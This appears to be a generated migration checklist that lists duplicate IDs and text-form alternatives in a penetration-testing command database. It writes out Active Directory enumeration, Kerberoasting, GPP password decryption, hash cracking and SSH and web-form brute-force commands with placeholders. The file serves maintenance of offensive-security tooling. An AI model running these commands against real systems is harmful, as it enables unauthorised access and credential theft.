# Migration Fixes - Detailed Checklist
**Generated**: 2025-11-08 23:53:13
**Total Commands**: 791
**Total Violations**: 643

---
## Summary
| Violation Type | Count | Status |
|----------------|-------|--------|
| Prerequisites Text | 189 | ❌ |
| Alternatives Text | 387 | ❌ |
| Duplicate Ids | 14 | ❌ |
| Orphaned References | 53 | ❌ |

---
## 🔴 Duplicate IDs

**Total**: 14

### 1. `john-test-rules`

- [ ] **ID**: `john-test-rules`
- [ ] **Location 1**: `enumeration/password-attacks-john.json`
- [ ] **Location 2**: `enumeration/password-attacks-wordlist-rules.json`
- [ ] **Action**: Rename or remove duplicate

### 2. `cme-smb-shares`

- [ ] **ID**: `cme-smb-shares`
- [ ] **Location 1**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Location 2**: `generated/active-directory-additions.json`
- [ ] **Action**: Rename or remove duplicate

### 3. `sshuttle-vpn`

- [ ] **ID**: `sshuttle-vpn`
- [ ] **Location 1**: `generated/tunneling-additions.json`
- [ ] **Location 2**: `pivoting/pivot-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 4. `proxychains-config`

- [ ] **ID**: `proxychains-config`
- [ ] **Location 1**: `generated/tunneling-additions.json`
- [ ] **Location 2**: `pivoting/proxychains-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 5. `socat-port-forward`

- [ ] **ID**: `socat-port-forward`
- [ ] **Location 1**: `generated/tunneling-additions.json`
- [ ] **Location 2**: `pivoting/ssh-tunneling.json`
- [ ] **Action**: Rename or remove duplicate

### 6. `netsh-portproxy-add`

- [ ] **ID**: `netsh-portproxy-add`
- [ ] **Location 1**: `firewall.json`
- [ ] **Location 2**: `pivoting/windows-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 7. `netsh-portproxy-show`

- [ ] **ID**: `netsh-portproxy-show`
- [ ] **Location 1**: `firewall.json`
- [ ] **Location 2**: `pivoting/windows-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 8. `netsh-firewall-add-rule`

- [ ] **ID**: `netsh-firewall-add-rule`
- [ ] **Location 1**: `firewall.json`
- [ ] **Location 2**: `pivoting/windows-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 9. `netsh-firewall-delete-rule`

- [ ] **ID**: `netsh-firewall-delete-rule`
- [ ] **Location 1**: `firewall.json`
- [ ] **Location 2**: `pivoting/windows-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 10. `netsh-firewall-show`

- [ ] **ID**: `netsh-firewall-show`
- [ ] **Location 1**: `firewall.json`
- [ ] **Location 2**: `pivoting/windows-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 11. `powershell-wget`

- [ ] **ID**: `powershell-wget`
- [ ] **Location 1**: `generated/file-transfer-additions.json`
- [ ] **Location 2**: `pivoting/windows-utilities.json`
- [ ] **Action**: Rename or remove duplicate

### 12. `certutil-download`

- [ ] **ID**: `certutil-download`
- [ ] **Location 1**: `pivoting/windows-utilities.json`
- [ ] **Location 2**: `post-exploit/general-transfer.json`
- [ ] **Action**: Rename or remove duplicate

### 13. `verify-root-access`

- [ ] **ID**: `verify-root-access`
- [ ] **Location 1**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Location 2**: `post-exploit/linux-sudo-commands.json`
- [ ] **Action**: Rename or remove duplicate

### 14. `verify-root-access`

- [ ] **ID**: `verify-root-access`
- [ ] **Location 1**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Location 2**: `post-exploit/linux-suid-basic-commands.json`
- [ ] **Action**: Rename or remove duplicate


---
## 🟡 Alternatives Using Text

**Total**: 387

### 1. `net-user-domain-list`

- [ ] **Command ID**: `net-user-domain-list`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser`
  - `ldapsearch -x -H ldap://<DC> -b 'DC=corp,DC=com' '(objectClass=user)'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 2. `net-user-domain-detail`

- [ ] **Command ID**: `net-user-domain-detail`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser -Identity <USERNAME>`
  - `Get-ADUser -Identity <USERNAME> -Properties *`
- [ ] **Action**: Replace with command IDs or create missing commands

### 3. `net-group-domain-list`

- [ ] **Command ID**: `net-group-domain-list`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetGroup`
  - `Get-ADGroup -Filter *`
- [ ] **Action**: Replace with command IDs or create missing commands

### 4. `net-group-domain-members`

- [ ] **Command ID**: `net-group-domain-members`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetGroup "<GROUPNAME>" | select member`
  - `Get-NetGroupMember -Identity "<GROUPNAME>"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 5. `net-accounts-domain`

- [ ] **Command ID**: `net-accounts-domain`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `crackmapexec smb <DC> -u <USERNAME> -p <PASSWORD> --pass-pol`
  - `ldapsearch -x -H ldap://<DC> -b 'DC=corp,DC=com' '(objectClass=domainPolicy)'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 6. `setspn-list-user`

- [ ] **Command ID**: `setspn-list-user`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
  - `Invoke-Kerberoast -Identity <USERNAME>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 7. `setspn-query-all`

- [ ] **Command ID**: `setspn-query-all`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser -SPN`
  - `ldapsearch -x -H ldap://<DC> -b 'DC=corp,DC=com' '(servicePrincipalName=*)'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 8. `dsquery-user`

- [ ] **Command ID**: `dsquery-user`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `net-user-domain-list`
  - `Get-NetUser`
  - `Get-ADUser -Filter *`
- [ ] **Action**: Replace with command IDs or create missing commands

### 9. `dsquery-computer`

- [ ] **Command ID**: `dsquery-computer`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetComputer`
  - `Get-ADComputer -Filter *`
  - `nmap -sn <SUBNET> (if dsquery unavailable)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 10. `dsquery-group`

- [ ] **Command ID**: `dsquery-group`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `net-group-domain-list`
  - `Get-NetGroup`
  - `Get-ADGroup -Filter *`
- [ ] **Action**: Replace with command IDs or create missing commands

### 11. `net-group-domain-admins`

- [ ] **Command ID**: `net-group-domain-admins`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetGroupMember -GroupName 'Domain Admins'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 12. `net-domain-controllers`

- [ ] **Command ID**: `net-domain-controllers`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetDomainController`
  - `nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 13. `setspn-list-all`

- [ ] **Command ID**: `setspn-list-all`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser -SPN`
- [ ] **Action**: Replace with command IDs or create missing commands

### 14. `dsquery-users`

- [ ] **Command ID**: `dsquery-users`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser`
  - `net user /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 15. `dsquery-admins`

- [ ] **Command ID**: `dsquery-admins`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `net group "Domain Admins" /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 16. `dsquery-domain-controllers`

- [ ] **Command ID**: `dsquery-domain-controllers`
- [ ] **File**: `enumeration/ad-legacy-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `nltest /dclist:<DOMAIN>`
  - `Get-NetDomainController`
- [ ] **Action**: Replace with command IDs or create missing commands

### 17. `ps-get-current-domain`

- [ ] **Command ID**: `ps-get-current-domain`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetDomain`
  - `$env:USERDNSDOMAIN`
  - `systeminfo | findstr /B /C:"Domain"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 18. `ps-get-pdc`

- [ ] **Command ID**: `ps-get-pdc`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetDomainController`
  - `nltest /dclist:<DOMAIN>`
  - `nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 19. `ps-get-distinguished-name`

- [ ] **Command ID**: `ps-get-distinguished-name`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `$env:USERDNSDOMAIN | ForEach-Object { 'DC=' + ($_ -replace '\.',',DC=') }`
  - `Get-ADDomain | select DistinguishedName`
- [ ] **Action**: Replace with command IDs or create missing commands

### 20. `ps-build-ldap-path`

- [ ] **Command ID**: `ps-build-ldap-path`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Hardcode if known: $LDAP = 'LDAP://DC1.corp.com/DC=corp,DC=com'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 21. `ps-directorysearcher-users`

- [ ] **Command ID**: `ps-directorysearcher-users`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser`
  - `net user /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 22. `ps-directorysearcher-groups`

- [ ] **Command ID**: `ps-directorysearcher-groups`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetGroup`
  - `net group /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 23. `ps-directorysearcher-computers`

- [ ] **Command ID**: `ps-directorysearcher-computers`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetComputer`
  - `dsquery computer`
  - `nmap -sn <SUBNET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 24. `ps-ldapsearch-function`

- [ ] **Command ID**: `ps-ldapsearch-function`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Save as script and dot-source: . .\LDAPSearch.ps1`
  - `Add to PowerShell profile for persistence`
- [ ] **Action**: Replace with command IDs or create missing commands

### 25. `ps-ldapsearch-users`

- [ ] **Command ID**: `ps-ldapsearch-users`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser`
  - `net user /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 26. `ps-ldapsearch-spns`

- [ ] **Command ID**: `ps-ldapsearch-spns`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser -SPN`
  - `setspn -T <DOMAIN> -Q */*`
- [ ] **Action**: Replace with command IDs or create missing commands

### 27. `ps-ldapsearch-admins`

- [ ] **Command ID**: `ps-ldapsearch-admins`
- [ ] **File**: `enumeration/ad-powershell-ldap.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetUser -AdminCount`
- [ ] **Action**: Replace with command IDs or create missing commands

### 28. `ps-get-group-members-basic`

- [ ] **Command ID**: `ps-get-group-members-basic`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `powerview-get-netgroupmember`
  - `net group "<GROUP_NAME>" /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 29. `ps-nested-group-check-member-type`

- [ ] **Command ID**: `ps-nested-group-check-member-type`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `powerview-get-netgroupmember`
  - `Manual check: Look for 'CN=Users' or 'CN=Groups' in DN path`
- [ ] **Action**: Replace with command IDs or create missing commands

### 30. `ps-nested-group-recursive-function`

- [ ] **Command ID**: `ps-nested-group-recursive-function`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `powerview-get-netgroupmember`
  - `Manual iteration without recursion`
- [ ] **Action**: Replace with command IDs or create missing commands

### 31. `ps-get-last-nested-user`

- [ ] **Command ID**: `ps-get-last-nested-user`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `powerview-get-netuser`
  - `Manual attribute inspection: $script:AllUsers[-1].Properties | select description,info,comment`
- [ ] **Action**: Replace with command IDs or create missing commands

### 32. `ps-find-new-domain-admin`

- [ ] **Command ID**: `ps-find-new-domain-admin`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `powerview-get-netgroupmember`
  - `net group "Domain Admins" /domain`
  - `Get-ADGroupMember -Identity "Domain Admins" | Get-ADUser -Properties whencreated | Sort-Object whencreated`
- [ ] **Action**: Replace with command IDs or create missing commands

### 33. `powerview-get-domaingroup-recursive`

- [ ] **Command ID**: `powerview-get-domaingroup-recursive`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `ps-nested-group-recursive-function`
  - `net group "<GROUP_NAME>" /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 34. `ps-powerview-get-user-details`

- [ ] **Command ID**: `ps-powerview-get-user-details`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `ps-get-last-nested-user`
  - `LDAPSearch -LDAPQuery "(samAccountName=<USERNAME>)"`
  - `Get-ADUser -Identity <USERNAME> -Properties *`
- [ ] **Action**: Replace with command IDs or create missing commands

### 35. `ps-powerview-find-service-accounts`

- [ ] **Command ID**: `ps-powerview-find-service-accounts`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `Manual filter: LDAPSearch -LDAPQuery "(&(objectCategory=user)(samAccountName=*svc*))"`
  - `Search patterns: *sql*, *backup*, *service*, *admin*`
- [ ] **Action**: Replace with command IDs or create missing commands

### 36. `ps-extract-flag-from-user`

- [ ] **Command ID**: `ps-extract-flag-from-user`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `ps-get-last-nested-user`
  - `Get-DomainUser -Identity <USERNAME> | Select-Object description,info,comment`
- [ ] **Action**: Replace with command IDs or create missing commands

### 37. `ps-nested-group-one-liner`

- [ ] **Command ID**: `ps-nested-group-one-liner`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `powerview-get-domaingroup-recursive`
  - `Split into separate commands: ps-ldapsearch-function + ps-nested-group-recursive-function + ps-get-last-nested-user`
- [ ] **Action**: Replace with command IDs or create missing commands

### 38. `ps-compare-powerview-versions`

- [ ] **Command ID**: `ps-compare-powerview-versions`
- [ ] **File**: `enumeration/ad-powershell-nested-groups.json`
- [ ] **Current alternatives (text)**:
  - `Quick test: Get-NetGroupMember -GroupName "Domain Admins" (if fails with 'parameter not found', you have 3.0+)`
  - `Check module path: (Get-Module PowerView).Path | Select-String -Pattern 'version'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 39. `powerview-get-netdomain`

- [ ] **Command ID**: `powerview-get-netdomain`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `ps-get-current-domain`
  - `$env:USERDNSDOMAIN`
  - `systeminfo | findstr /B /C:"Domain"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 40. `powerview-get-netdomaincontroller`

- [ ] **Command ID**: `powerview-get-netdomaincontroller`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `nltest /dclist:<DOMAIN>`
  - `nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>`
  - `ps-get-pdc`
- [ ] **Action**: Replace with command IDs or create missing commands

### 41. `powerview-get-netuser-filter`

- [ ] **Command ID**: `powerview-get-netuser-filter`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `net-user-domain-detail`
  - `Get-NetUser | ? {$_.samaccountname -eq '<USERNAME>'}`
- [ ] **Action**: Replace with command IDs or create missing commands

### 42. `powerview-get-netuser-spn`

- [ ] **Command ID**: `powerview-get-netuser-spn`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `setspn-query-all`
  - `Get-NetUser | ? {$_.serviceprincipalname} | select samaccountname,serviceprincipalname`
- [ ] **Action**: Replace with command IDs or create missing commands

### 43. `powerview-get-netgroup-specific`

- [ ] **Command ID**: `powerview-get-netgroup-specific`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `net-group-domain-members`
  - `Get-NetGroupMember -Identity "<GROUPNAME>"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 44. `powerview-get-netcomputer`

- [ ] **Command ID**: `powerview-get-netcomputer`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `ps-directorysearcher-computers`
  - `dsquery-computer`
  - `nmap -sn <SUBNET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 45. `powerview-get-netou`

- [ ] **Command ID**: `powerview-get-netou`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `Get-ADOrganizationalUnit -Filter *`
  - `dsquery ou`
- [ ] **Action**: Replace with command IDs or create missing commands

### 46. `powerview-get-netgpo`

- [ ] **Command ID**: `powerview-get-netgpo`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `Get-GPO -All`
  - `Search SYSVOL for GPP passwords`
- [ ] **Action**: Replace with command IDs or create missing commands

### 47. `powerview-get-netforest`

- [ ] **Command ID**: `powerview-get-netforest`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `Get-ADForest`
  - `[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()`
- [ ] **Action**: Replace with command IDs or create missing commands

### 48. `powerview-get-netuser-all`

- [ ] **Command ID**: `powerview-get-netuser-all`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `net user /domain`
  - `LDAPSearch -LDAPQuery "(objectClass=user)"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 49. `powerview-get-netcomputer-all`

- [ ] **Command ID**: `powerview-get-netcomputer-all`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `net group "Domain Computers" /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 50. `powerview-get-netcomputer-ping`

- [ ] **Command ID**: `powerview-get-netcomputer-ping`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `nmap -sn <SUBNET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 51. `powerview-get-netgroup-recursive`

- [ ] **Command ID**: `powerview-get-netgroup-recursive`
- [ ] **File**: `enumeration/ad-powerview-core.json`
- [ ] **Current alternatives (text)**:
  - `net group "Domain Admins" /domain`
- [ ] **Action**: Replace with command IDs or create missing commands

### 52. `powerview-get-objectacl-genericall`

- [ ] **Command ID**: `powerview-get-objectacl-genericall`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `Get-ObjectAcl -Identity "<OBJECT>" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll'}`
- [ ] **Action**: Replace with command IDs or create missing commands

### 53. `powerview-convert-sidtoname`

- [ ] **Command ID**: `powerview-convert-sidtoname`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `[System.Security.Principal.SecurityIdentifier]::new('<SID>').Translate([System.Security.Principal.NTAccount]).Value`
- [ ] **Action**: Replace with command IDs or create missing commands

### 54. `powerview-get-objectacl-writedacl`

- [ ] **Command ID**: `powerview-get-objectacl-writedacl`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty'}`
- [ ] **Action**: Replace with command IDs or create missing commands

### 55. `powerview-get-objectacl-forcechangepassword`

- [ ] **Command ID**: `powerview-get-objectacl-forcechangepassword`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `Check for AllExtendedRights (includes ForceChangePassword): Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}`
- [ ] **Action**: Replace with command IDs or create missing commands

### 56. `powerview-get-objectacl-writeowner`

- [ ] **Command ID**: `powerview-get-objectacl-writeowner`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `Check for WriteDACL - similar privilege escalation path`
- [ ] **Action**: Replace with command IDs or create missing commands

### 57. `powerview-find-interestingdomainacl`

- [ ] **Command ID**: `powerview-find-interestingdomainacl`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `Manual enumeration: Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}`
- [ ] **Action**: Replace with command IDs or create missing commands

### 58. `powerview-get-pathacl`

- [ ] **Command ID**: `powerview-get-pathacl`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `icacls \\<TARGET>\<SHARE>`
  - `Get-Acl -Path \\<TARGET>\<SHARE> | Format-List`
- [ ] **Action**: Replace with command IDs or create missing commands

### 59. `powerview-get-objectacl-user`

- [ ] **Command ID**: `powerview-get-objectacl-user`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `dsacls "<USER_DN>"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 60. `powerview-get-objectacl-group`

- [ ] **Command ID**: `powerview-get-objectacl-group`
- [ ] **File**: `enumeration/ad-powerview-permissions.json`
- [ ] **Current alternatives (text)**:
  - `dsacls "<GROUP_DN>"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 61. `powerview-get-netsession`

- [ ] **Command ID**: `powerview-get-netsession`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetLoggedon`
  - `PsLoggedOn.exe`
  - `qwinsta /server:<TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 62. `powerview-get-netloggedon`

- [ ] **Command ID**: `powerview-get-netloggedon`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `PsLoggedOn.exe`
  - `Get-NetSession`
  - `quser /server:<TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 63. `powerview-find-localadminaccess`

- [ ] **Command ID**: `powerview-find-localadminaccess`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `crackmapexec smb <SUBNET> -u <USER> -p <PASS> --local-auth`
  - `Manual testing: Test-AdminAccess -ComputerName <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 64. `powerview-find-domainshare`

- [ ] **Command ID**: `powerview-find-domainshare`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `net view \\<TARGET> /all`
  - `crackmapexec smb <SUBNET> -u <USER> -p <PASS> --shares`
- [ ] **Action**: Replace with command IDs or create missing commands

### 65. `powerview-find-domainshare-accessible`

- [ ] **Command ID**: `powerview-find-domainshare-accessible`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `crackmapexec smb <SUBNET> -u <USER> -p <PASS> --shares`
  - `net use \\<TARGET>\<SHARE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 66. `sysinternals-psloggedon`

- [ ] **Command ID**: `sysinternals-psloggedon`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `powerview-get-netloggedon`
  - `quser /server:<TARGET>`
  - `qwinsta /server:<TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 67. `net-view-shares`

- [ ] **Command ID**: `net-view-shares`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `powerview-find-domainshare`
  - `crackmapexec smb <TARGET> --shares`
- [ ] **Action**: Replace with command IDs or create missing commands

### 68. `test-share-access`

- [ ] **Command ID**: `test-share-access`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `ls \\<TARGET>\<SHARE>`
  - `Get-ChildItem \\<TARGET>\<SHARE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 69. `search-share-files`

- [ ] **Command ID**: `search-share-files`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `Select-String -Path \\<TARGET>\<SHARE>\* -Pattern <PATTERN> -Recurse`
- [ ] **Action**: Replace with command IDs or create missing commands

### 70. `gpp-password-decrypt`

- [ ] **Command ID**: `gpp-password-decrypt`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `Get-DecryptedCpassword (PowerSploit)`
  - `python scripts: gpp-decrypt.py`
- [ ] **Action**: Replace with command IDs or create missing commands

### 71. `powerview-find-domainshare-exclude`

- [ ] **Command ID**: `powerview-find-domainshare-exclude`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `net view \\<COMPUTER>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 72. `psloggedon`

- [ ] **Command ID**: `psloggedon`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `Get-NetLoggedon`
  - `query user /server:<COMPUTER>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 73. `gpp-password-files`

- [ ] **Command ID**: `gpp-password-files`
- [ ] **File**: `enumeration/ad-session-share-enum.json`
- [ ] **Current alternatives (text)**:
  - `Get-GPPPassword (PowerSploit)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 74. `hashcat-md5-crack`

- [ ] **Command ID**: `hashcat-md5-crack`
- [ ] **File**: `enumeration/password-attacks-hashcat.json`
- [ ] **Current alternatives (text)**:
  - `john --format=raw-md5 <HASH_FILE> --wordlist=<WORDLIST>`
  - `Manual: for pw in $(cat wordlist); do echo -n "$pw" | md5sum; done`
- [ ] **Action**: Replace with command IDs or create missing commands

### 75. `hashcat-keepass-crack`

- [ ] **Command ID**: `hashcat-keepass-crack`
- [ ] **File**: `enumeration/password-attacks-hashcat.json`
- [ ] **Current alternatives (text)**:
  - `john --format=keepass <HASH_FILE> --wordlist=<WORDLIST> --rules=<RULE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 76. `hashcat-ssh-key-crack`

- [ ] **Command ID**: `hashcat-ssh-key-crack`
- [ ] **File**: `enumeration/password-attacks-hashcat.json`
- [ ] **Current alternatives (text)**:
  - `john --format=SSH <HASH_FILE> --wordlist=<WORDLIST> --rules=<RULE> (supports aes-256-ctr)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 77. `hydra-ssh-single-user`

- [ ] **Command ID**: `hydra-ssh-single-user`
- [ ] **File**: `enumeration/password-attacks-hydra.json`
- [ ] **Current alternatives (text)**:
  - `medusa -h <TARGET> -u <USERNAME> -P <WORDLIST> -M ssh`
  - `ncrack -p 22 -user <USERNAME> -P <WORDLIST> <TARGET>`
  - `Manual: for password in $(cat wordlist.txt); do sshpass -p "$password" ssh <USERNAME>@<TARGET>; done`
- [ ] **Action**: Replace with command IDs or create missing commands

### 78. `hydra-http-post-form`

- [ ] **Command ID**: `hydra-http-post-form`
- [ ] **File**: `enumeration/password-attacks-hydra.json`
- [ ] **Current alternatives (text)**:
  - `wfuzz -c -z file,<WORDLIST> -d "fm_usr=<USER>&fm_pwd=FUZZ" --hs "<FAIL_STRING>" http://<TARGET>/<PAGE>`
  - `ffuf -w <WORDLIST>:FUZZ -X POST -d "fm_usr=<USER>&fm_pwd=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://<TARGET>/<PAGE> -fr "<FAIL_STRING>"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 79. `hydra-smb-attack`

- [ ] **Command ID**: `hydra-smb-attack`
- [ ] **File**: `enumeration/password-attacks-hydra.json`
- [ ] **Current alternatives (text)**:
  - `crackmapexec smb <TARGET> -u <USER> -p <WORDLIST>`
  - `smbclient -U <USER> -L //<TARGET> (manual testing)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 80. `john-single-crack`

- [ ] **Command ID**: `john-single-crack`
- [ ] **File**: `enumeration/password-attacks-john.json`
- [ ] **Current alternatives (text)**:
  - `hashcat with prince attack (similar username-based mutations)`
